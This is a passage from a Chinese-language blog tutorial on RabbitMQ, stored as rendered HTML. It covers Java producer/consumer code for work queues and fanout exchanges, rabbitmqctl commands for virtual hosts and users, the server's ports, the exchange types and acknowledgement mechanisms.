&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"多个消费者\"><a href=\"#多个消费者\" class=\"headerlink\" title=\"多个消费者\"></a>多个消费者</h3><p>基于设QOS且存在ACK的情况</p>\n<p>生产者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class RabbitQueueProducer &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException &#123;</span><br><span class=\"line\">\t\tChannel channel = createConnectChannel();</span><br><span class=\"line\">\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tScanner sc = new Scanner(System.in);</span><br><span class=\"line\">\t\tString nextLine = sc.nextLine();</span><br><span class=\"line\">\t\tsc.close();</span><br><span class=\"line\">\t\tif (!nextLine.contains(&quot;.&quot;)) nextLine += &quot;.&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tString message = String.join(&quot;&quot;, nextLine);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.basicPublish(&quot;&quot;, QUEUE_NAME, MessageProperties.PERSISTENT_TEXT_PLAIN, message.getBytes());</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [x] Sent &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">\t\tcloseConnection(channel);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>消费者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class RabbitQueueConsumer &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tprivate static SimpleDateFormat sdf = new SimpleDateFormat(&quot;HH:mm:ss.SSS&quot;);</span><br><span class=\"line\">\tprivate static void doWork(String task) &#123;</span><br><span class=\"line\">\t\tfor (char ch : task.toCharArray()) &#123;</span><br><span class=\"line\">\t\t\tif (ch == &apos;.&apos;) &#123;</span><br><span class=\"line\">\t\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\t\tThread.sleep(1000l);</span><br><span class=\"line\">\t\t\t\t&#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">\t\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t\t\tThread.currentThread().interrupt();</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125; </span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException, InterruptedException &#123;</span><br><span class=\"line\">\t\tChannel channel = createConnectChannel();</span><br><span class=\"line\">\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);</span><br><span class=\"line\">\t\tThread.sleep(4000l);</span><br><span class=\"line\">\t\tchannel.basicQos(1);</span><br><span class=\"line\">\t\tCountDownLatch cdl = new CountDownLatch(1);</span><br><span class=\"line\">\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -&gt; &#123;</span><br><span class=\"line\">            String message = new String(delivery.getBody(), &quot;UTF-8&quot;);</span><br><span class=\"line\">            long deliveryTag = delivery.getEnvelope().getDeliveryTag();</span><br><span class=\"line\">            System.out.println(&quot; [!] Delivery TAG &apos;&quot; + deliveryTag + &quot;&apos;&quot;);</span><br><span class=\"line\">            System.out.println(&quot; [x] Received &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">            \tdoWork(message);</span><br><span class=\"line\">            &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            \tSystem.out.println(&quot; [x] Done&quot;);</span><br><span class=\"line\">            \tchannel.basicNack(delivery.getEnvelope().getDeliveryTag(), false, false);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            boolean ack = Math.random() &gt; 0.5;</span><br><span class=\"line\">            System.out.println(&quot; [a] ACK &apos;&quot; + ack + &quot;&apos; &quot; + sdf.format(new Date()));</span><br><span class=\"line\">            if (ack) &#123;</span><br><span class=\"line\">            \tchannel.basicAck(deliveryTag, false);</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">            \tchannel.basicNack(deliveryTag, false, true);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            cdl.countDown();</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        System.out.println(&quot; [*] Waiting for messages  &quot; + sdf.format(new Date()));</span><br><span class=\"line\">        channel.basicConsume(QUEUE_NAME, false, deliverCallback, consumerTag -&gt; &#123;</span><br><span class=\"line\">        \tSystem.out.println(&quot; [x] Cancel &apos;&quot; + consumerTag + &quot;&apos;&quot;);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        cdl.await();</span><br><span class=\"line\">        closeConnection(channel);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Fanout\"><a href=\"#Fanout\" class=\"headerlink\" title=\"Fanout\"></a>Fanout</h3><p>生产者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class RabbitFanoutProducer &#123;\t</span><br><span class=\"line\">\tprivate final static String EXCHANGE_NAME = &quot;fanout&quot;;</span><br><span class=\"line\">\tprivate final static String ROUTING_KEY = &quot;&quot;;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException &#123;</span><br><span class=\"line\">\t\tChannel channel = createConnectChannel();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tScanner sc = new Scanner(System.in);</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [!] Enter Message&quot;);</span><br><span class=\"line\">\t\tString nextLine = sc.nextLine();</span><br><span class=\"line\">\t\tsc.close();</span><br><span class=\"line\">\t\tif (!nextLine.contains(&quot;.&quot;)) nextLine += &quot;.&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tString message = String.join(&quot;&quot;, nextLine);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.basicPublish(EXCHANGE_NAME, ROUTING_KEY, null, message.getBytes());</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [x] Sent &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">\t\tcloseConnection(channel);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>消费者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class RabbitFanoutConsumer &#123;</span><br><span class=\"line\">\tprivate final static String EXCHANGE_NAME = &quot;fanout&quot;;</span><br><span class=\"line\">\tprivate final static String ROUTING_KEY = &quot;&quot;;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException, InterruptedException &#123;</span><br><span class=\"line\">\t\tChannel channel = createConnectChannel();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tScanner sc = new Scanner(System.in);</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [!] Enter Queue Name&quot;);</span><br><span class=\"line\">\t\tString queueName = sc.nextLine();</span><br><span class=\"line\">\t\tsc.close();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.queueDeclare(queueName, false, false, false, null);</span><br><span class=\"line\">\t\tchannel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.FANOUT);</span><br><span class=\"line\">\t\tchannel.queueBind(queueName, EXCHANGE_NAME, ROUTING_KEY);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [*] Waiting for messages. To exit press CTRL+C&quot;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tCountDownLatch cdl = new CountDownLatch(3);</span><br><span class=\"line\">\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -&gt; &#123;</span><br><span class=\"line\">            String message = new String(delivery.getBody(), &quot;UTF-8&quot;);</span><br><span class=\"line\">            </span><br><span class=\"line\">            System.out.println(&quot; [x] Received &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">            cdl.countDown();</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        channel.basicConsume(queueName, true, deliverCallback, consumerTag -&gt; &#123; &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        </span><br><span class=\"line\">        cdl.await();</span><br><span class=\"line\">        closeConnection(channel);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1. 安装\"></a>1. 安装</h2><p>使用docker方式，拉取镜像uetty/rabbitmq</p>\n<p>具体Dockerfile的命令 -&gt; <a href=\"https://github.com/Uetty/dockerfile/blob/master/docker-rabbitmq/Dockerfile\" target=\"_blank\" rel=\"noopener\">Dockerfile</a></p>\n<p>额外的TIP: 由于Linux机器上会有最大打开文件个数限制，Rabbitmq又依赖文件操作，所以应将Linux的所有用户打开文件限制调高到64000，Rabbitmq程序所属的用户的打开文件限制调高到64000，这一块见官网（<a href=\"https://www.rabbitmq.com/install-debian.html#kernel-resource-limits\" target=\"_blank\" rel=\"noopener\">文件限制</a>）</p>\n<h2 id=\"2-虚拟主机\"><a href=\"#2-虚拟主机\" class=\"headerlink\" title=\"2. 虚拟主机\"></a>2. 虚拟主机</h2><p>Rabbitmq是多租户系统，存在虚拟主机（把它想象成为数据库）的概念，用户对它的连接、队列、绑定、路由等操作是基于虚拟主机上的。通过<code>rabbitmqctl add_vhost vhostname</code>命令来增加虚拟主机，<code>rabbitmqctl delete_vhost vhostname</code>命令来删除虚拟主机，<code>rabbitmqctl list_vhosts [name tracing]</code>命令来显示虚拟主机列表。</p>\n<p>设置虚拟主机并发客户端总数：<code>rabbitmqctl set_vhost_limits -p test &#39;{&quot;max-connections&quot;: 256}&#39;</code></p>\n<p>设置虚拟主机最大队列数：<code>rabbitmqctl set_vhost_limits -p test &#39;{&quot;max-queues&quot;: 1024}&#39;</code></p>\n<p>显示虚拟主机参数：<code>rabbitmqctl list_vhost_limits -p test</code></p>\n<h2 id=\"3-启动与用户操作及权限\"><a href=\"#3-启动与用户操作及权限\" class=\"headerlink\" title=\"3. 启动与用户操作及权限\"></a>3. 启动与用户操作及权限</h2><p>启动命令：<code>service rabbitmq-server start</code>  </p>\n<p>Rabbit提供了用户名密码的方式认证和X509证书的方式认证，，这里只记用户名密码的方式 </p>\n<p>初始用户：刚创建的实例，有默认的用户guest密码guest，但只能在本机登陆（不鼓励将其配置成能远程登陆，其他用户默认是可以远程访问的） </p>\n<h3 id=\"用户设置（官网地址-）\"><a href=\"#用户设置（官网地址-）\" class=\"headerlink\" title=\"用户设置（官网地址 ）\"></a>用户设置（<a href=\"https://www.rabbitmq.com/rabbitmqctl.8.html#User_Management\" target=\"_blank\" rel=\"noopener\">官网地址</a> ）</h3><p>添加用户：<code>rabbitmqctl add_user janeway changeit</code> </p>\n<p>删除用户：<code>rabbitmqctl delete_user janeway</code> </p>\n<p>变更密码：<code>rabbitmqctl change_password janeway newpass</code> </p>\n<p>验证用户名密码：<code>rabbitmqctl authenticate_user janeway verifyit</code> </p>\n<p>显示用户列表：<code>rabbitmqctl list_users</code> </p>\n<h3 id=\"用户权限\"><a href=\"#用户权限\" class=\"headerlink\" title=\"用户权限\"></a>用户权限</h3><p>设置用户TAG：<code>rabbitmqctl set_user_tags janeway administrator</code> </p>\n<p>删除用户TAG：<code>rabbitmqctl set_user_tags janeway</code> </p>\n<p>TIP: 用户TAG与全局权限绑定（包括登陆可视化管理界面的权限等），具体见官网（<a href=\"https://www.rabbitmq.com/management.html#permissions\" target=\"_blank\" rel=\"noopener\">TAG权限表</a>）</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Tag</th>\n<th align=\"left\">Capabilities</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">(None)</td>\n<td align=\"left\">No access to the management plugin</td>\n</tr>\n<tr>\n<td align=\"left\">management</td>\n<td align=\"left\">Anything the user could do via messaging protocols plus:List virtual hosts to which they can log in via AMQPView all queues, exchanges and bindings in “their” virtual hostsView and close their own channels and connectionsView “global” statistics covering all their virtual hosts, including activity by other users within them</td>\n</tr>\n<tr>\n<td align=\"left\">policymaker</td>\n<td align=\"left\">Everything “management” can plus:View, create and delete policies and parameters for virtual hosts to which they can log in via AMQP</td>\n</tr>\n<tr>\n<td align=\"left\">monitoring</td>\n<td align=\"left\">Everything “management” can plus:List all virtual hosts, including ones they could not access using messaging protocolsView other users’s connections and channelsView node-level data such as memory use and clusteringView truly global statistics for all virtual hosts</td>\n</tr>\n<tr>\n<td align=\"left\">administrator</td>\n<td align=\"left\">Everything “policymaker” and “monitoring” can plus:Create and delete virtual hostsView, create and delete usersView, create and delete permissionsClose other users’s connections</td>\n</tr>\n</tbody></table>\n<p>设置用户在虚拟主机上的权限：<code>rabbitmqctl set_permissions -p vhostname username &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;</code> 后面三个参数分别表示配置权限、写权限、读权限，引号内的内容用正则表达式匹配队列键名（不指定[–vhost/-p]参数，默认主机为’/‘ ，下同） </p>\n<p>清除用户在虚拟主机上的权限：<code>rabbitmqctl clear_permissions -p vhostname username</code>  </p>\n<p>显示某个用户在虚拟主机上的权限：<code>rabbitmqctl list_user_permissions uetty</code>  </p>\n<p>显示某个虚拟主机上的用户权限：<code>rabbitmqctl list_permissions -p vhostname</code></p>\n<h2 id=\"4-端口介绍\"><a href=\"#4-端口介绍\" class=\"headerlink\" title=\"4. 端口介绍\"></a>4. 端口介绍</h2><ul>\n<li>4369: <a href=\"http://erlang.org/doc/man/epmd.html\" target=\"_blank\" rel=\"noopener\">epmd</a>, a peer discovery service used by RabbitMQ nodes and CLI tools</li>\n<li>5672, 5671: used by AMQP 0-9-1 and 1.0 clients without and with TLS</li>\n<li>25672: used for inter-node and CLI tools communication (Erlang distribution server port) and is allocated from a dynamic range (limited to a single port by default, computed as AMQP port + 20000). Unless external connections on these ports are really necessary (e.g. the cluster uses <a href=\"https://www.rabbitmq.com/federation.html\" target=\"_blank\" rel=\"noopener\">federation</a> or CLI tools are used on machines outside the subnet), these ports should not be publicly exposed. See <a href=\"https://www.rabbitmq.com/networking.html\" target=\"_blank\" rel=\"noopener\">networking guide</a> for details.</li>\n<li>35672-35682: used by CLI tools (Erlang distribution client ports) for communication with nodes and is allocated from a dynamic range (computed as server distribution port + 10000 through server distribution port + 10010). See <a href=\"https://www.rabbitmq.com/networking.html\" target=\"_blank\" rel=\"noopener\">networking guide</a> for details.</li>\n<li>15672: <a href=\"https://www.rabbitmq.com/management.html\" target=\"_blank\" rel=\"noopener\">HTTP API</a> clients, <a href=\"https://www.rabbitmq.com/management.html\" target=\"_blank\" rel=\"noopener\">management UI</a> and <a href=\"https://www.rabbitmq.com/management-cli.html\" target=\"_blank\" rel=\"noopener\">rabbitmqadmin</a> (only if the <a href=\"https://www.rabbitmq.com/management.html\" target=\"_blank\" rel=\"noopener\">management plugin</a> is enabled)</li>\n<li>61613, 61614: <a href=\"https://stomp.github.io/stomp-specification-1.2.html\" target=\"_blank\" rel=\"noopener\">STOMP clients</a> without and with TLS (only if the <a href=\"https://www.rabbitmq.com/stomp.html\" target=\"_blank\" rel=\"noopener\">STOMP plugin</a> is enabled)</li>\n<li>1883, 8883: (<a href=\"http://mqtt.org/\" target=\"_blank\" rel=\"noopener\">MQTT clients</a> without and with TLS, if the <a href=\"https://www.rabbitmq.com/mqtt.html\" target=\"_blank\" rel=\"noopener\">MQTT plugin</a> is enabled</li>\n<li>15674: STOMP-over-WebSockets clients (only if the <a href=\"https://www.rabbitmq.com/web-stomp.html\" target=\"_blank\" rel=\"noopener\">Web STOMP plugin</a> is enabled)</li>\n<li>15675: MQTT-over-WebSockets clients (only if the <a href=\"https://www.rabbitmq.com/web-mqtt.html\" target=\"_blank\" rel=\"noopener\">Web MQTT plugin</a> is enabled)</li>\n</ul>\n<p>5671端口：AMQP协议使用，且TLS加密</p>\n<p>5672端口：AMQP协议使用，且不加密</p>\n<p>15672端口：HTTP协议使用，或者开启可视化管理页面后，页面地址所在端口</p>\n<p>61613端口：STOMP协议使用，且不加密</p>\n<p>61614端口：STOMP协议使用，且TLS加密</p>\n<p>1883端口：MQTT协议使用，且不加密</p>\n<p>8883端口：MQTT协议使用，且TLS加密</p>\n<p>15674端口：Websocket协议上的STOMP协议使用</p>\n<p>15675端口：Websocket协议上的MQTT协议使用</p>\n<p>TIP:  较常用的是5672端口（一般选择AMQP协议，有加密需求的化是5671端口）和15672端口</p>\n<h2 id=\"5-交换机、队列与消息的路由\"><a href=\"#5-交换机、队列与消息的路由\" class=\"headerlink\" title=\"5. 交换机、队列与消息的路由\"></a>5. 交换机、队列与消息的路由</h2><p>在Rabbitmq中，生产者是将消息推送到交换机里，交换机负责将消息路由到队列中，消费者再从队列中消费消息。这里涉及到了两个概念，<code>交换机</code>和<code>队列</code>，在此基础上引申出了三个操作：<code>交换机的声明</code>、<code>队列的声明</code>、<code>交换机和队列绑定的声明</code>，这三个操作的完成是基于<code>交换机名</code>、<code>队列名</code>、<code>路由键</code>这三个属性的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1) 通过channel.exchangeDeclare(&quot;exchangeName&quot;, BuiltinExchangeType.类型);声明交换机</span><br><span class=\"line\">2) 通过String queueName = channel.queueDeclare().getQueue();声明队列，并返回自动生成的队列的名称</span><br><span class=\"line\">   也可以通过channel.queueDeclare(queueName, durable, exclusive, autoDelete, arguments);声明命名的队列</span><br><span class=\"line\">   第二种声明方式的参数解释：durable为是否持久化到磁盘，它将使服务器重启后数据仍然存在；exclusive为是否排他队列，具有基于连接的排他性；autoDelete是否自动删除，在没有订阅者的情况下是否自动删除</span><br><span class=\"line\">3) 通过channel.queueBind(queueName, &quot;exchangeName&quot;, &quot;routingKey&quot;);绑定队列和交换机</span><br></pre></td></tr></table></figure>\n\n<p>TIP:  队列本身还包含了许多属性，例如：名称、交换代理重启后是否仍保存、自动删除、队列长度等参数，在声明队列的时候可以给定。</p>\n<p>交换机种类主要有四种，以下介绍这几种交换机：</p>\n<ol>\n<li>直连交换机(direct)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在直连交换机的三个声明操作中，交换机名、队列名都是不能为空字符串，路由键可以为空字符串但已被使用。发送到直连交换机的消息直接根据路由键进行完全匹配，将消息路由到所有以该路由键与该交换机绑定的队列中。</span><br><span class=\"line\"></span><br><span class=\"line\">1) 生产者通过channel.basicPublish(&quot;exchangeName&quot;, routingKey, null, message.getBytes(&quot;UTF-8&quot;));提交数据到Rabbitmq</span><br><span class=\"line\"></span><br><span class=\"line\">2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -&gt; &#123;&#125;, consumerTag -&gt; &#123; &#125;);从Rabbitmq消费消息</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>扇形交换机(fanout)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">该交换机的设计思想是一个消息广播，在扇形交换机的三个声明操作中，路由键名可以为空字符串（事实上它会被忽略）。发送到扇形交换机的消息，会被路由到所有绑定在该交换机上的队列中（与直连交换机不同的是不再根据路由键进行筛选）。</span><br><span class=\"line\"></span><br><span class=\"line\">1) 生产者通过channel.basicPublish(&quot;exchangeName&quot;, &quot;&quot;, null, message.getBytes(&quot;UTF-8&quot;));提交数据到Rabbitmq</span><br><span class=\"line\"></span><br><span class=\"line\">2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -&gt; &#123;&#125;, consumerTag -&gt; &#123; &#125;);从Rabbitmq消费消息</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>主题交换机(topic)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在主题交换机的三个声明中，路由键的命名是受限制的，必须由点号分割的多个单词或星号或井号组成，*用于匹配一个单词，井号用于匹配零到多个单词，发送到主题交换机的消息，会根据路由键匹配来路由到队列中。</span><br><span class=\"line\"></span><br><span class=\"line\">1) 生产者通过channel.basicPublish(EXCHANGE_NAME, routingKey, null, message.getBytes(&quot;UTF-8&quot;));发送数据到Rabbitmq</span><br><span class=\"line\"></span><br><span class=\"line\">2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -&gt; &#123;&#125;, consumerTag -&gt; &#123; &#125;);从Rabbitmq消费消息</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>首部交换机(match 和 headers)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在首部交换机中，路由键名可以是空字符串（事实上它会被忽略），它的路由规则转而由首部属性决定，其中最重要的一个属性是x-match，该属性有两个取值（any/all）,any表示发布消息时携带的键值对有一对能匹配上队列定义的其中一个就能，all表示所有的键值对需完全匹配。另外以x-开头的属性不被视作用于路由匹配的属性。</span><br><span class=\"line\">该模式下，交换机和队列绑定需要增加headers值，可通过如下设置：</span><br><span class=\"line\">Map&lt;String, Object&gt; arguments = new HashMap&lt;String, Object&gt;();</span><br><span class=\"line\">arguments.put(&quot;x-match&quot;, &quot;any&quot;);</span><br><span class=\"line\">arguments.put(&quot;arg1&quot;, &quot;a1&quot;);</span><br><span class=\"line\">arguments.put(&quot;latitude&quot;, 51.5252949);</span><br><span class=\"line\">arguments.put(&quot;dataType&quot;, &quot;json&quot;);</span><br><span class=\"line\">channel.queueBind(queueName, EXCHANGE_NAME, &quot;&quot;, arguments);</span><br><span class=\"line\"></span><br><span class=\"line\">使用：</span><br><span class=\"line\">1) 生产者通过如下代码发送消息到Rabbitmq</span><br><span class=\"line\">Map&lt;String, Object&gt; headers = new HashMap&lt;String, Object&gt;();</span><br><span class=\"line\">headers.put(&quot;latitude&quot;,  51.5252949);</span><br><span class=\"line\">headers.put(&quot;longitude&quot;, -0.0905493);</span><br><span class=\"line\">channel.basicPublish(exchangeName, &quot;&quot;,</span><br><span class=\"line\">             new AMQP.BasicProperties.Builder()</span><br><span class=\"line\">               .headers(headers)</span><br><span class=\"line\">               .build(),</span><br><span class=\"line\">               message.getBytes(&quot;UTF-8&quot;));</span><br><span class=\"line\">               </span><br><span class=\"line\">2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -&gt; &#123;&#125;, consumerTag -&gt; &#123; &#125;);从Rabbitmq消费消息</span><br></pre></td></tr></table></figure>\n\n<p>默认交换机规则是一个空字符串路由键的直连交换机定义<a href=\"https://www.rabbitmq.com/tutorials/amqp-concepts.html#exchange-default\" target=\"_blank\" rel=\"noopener\">官网</a>，该交换机的路由键与队列键名相同，这使其看起来像是客户端直接提交消息到了队列中。所有新建的队列都天生绑定了这个默认交换机，它的存在也方便了一些简单需求的应用直接使用Rabbitmq。</p>\n<h2 id=\"6-ACK、TRANSACTION、RECOVERY和QOS\"><a href=\"#6-ACK、TRANSACTION、RECOVERY和QOS\" class=\"headerlink\" title=\"6. ACK、TRANSACTION、RECOVERY和QOS\"></a>6. ACK、TRANSACTION、RECOVERY和QOS</h2><h3 id=\"ACK、TRANSACTION和RECOVERY\"><a href=\"#ACK、TRANSACTION和RECOVERY\" class=\"headerlink\" title=\"ACK、TRANSACTION和RECOVERY\"></a>ACK、TRANSACTION和RECOVERY</h3><p>​        消费者消费队列消息时，过程中可能由于网络原因或业务原因，出现连接断开或者消费者未接收到消息或者消费者不能成功处理消息，这个时候可能会导致数据的丢失。基于这一点，Rabbitmq提供了，TRANSACRION机制、ACK机制和RECOVERY机制。</p>\n<p>​        RECOVERY机制：Rabbitmq JAVA客户端提供连接恢复的功能，在启用该功能时，当客户端由于网络问题断开，会自动恢复客户端，包括恢复连接、恢复连接监听器、重新打开信道及监听器、恢复QOS设置、重新声明交换机、重新声明队列、恢复绑定和消费者，可以通过<code>factory.setAutomaticRecoveryEnabled(true)</code>来打开RECOVERY机制。</p>\n<p>​        